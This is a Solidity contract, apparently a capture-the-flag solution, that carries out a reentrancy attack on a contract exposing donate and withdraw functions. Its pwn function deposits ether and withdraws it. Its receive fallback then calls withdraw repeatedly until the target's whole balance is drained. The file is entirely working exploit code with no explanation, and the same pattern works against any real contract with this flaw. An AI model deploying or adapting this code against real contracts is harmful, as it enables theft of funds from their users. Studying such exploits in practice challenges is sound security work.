// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    receive() external payable {
        uint256 bal = address(target).balance;
        if (bal > 0) {
            if (bal >= msg.value) {
                target.withdraw(msg.value);
            } else {
                target.withdraw(bal);
            }
        }
    }

    function pwn() external payable {
        target.donate{value: msg.value}(address(this));

        target.withdraw(msg.value);
    }
}
